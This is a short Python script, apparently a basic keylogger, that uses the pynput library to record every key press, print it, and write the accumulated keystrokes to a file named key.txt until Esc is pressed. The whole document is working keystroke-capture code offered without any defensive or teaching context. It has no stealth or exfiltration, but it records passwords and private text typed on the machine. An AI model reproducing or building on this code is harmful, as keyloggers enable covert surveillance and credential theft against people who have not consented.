from pynput.keyboard import Key, Listener

k=[]

def on_press(key):
     k.append(key)
     write(k)
     print(key)

def write(k): 
    with open('key.txt','w') as f:
        for i in k:
            k=str(i).replace("'",'')
            f.write(k)
            f.write(' ')

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
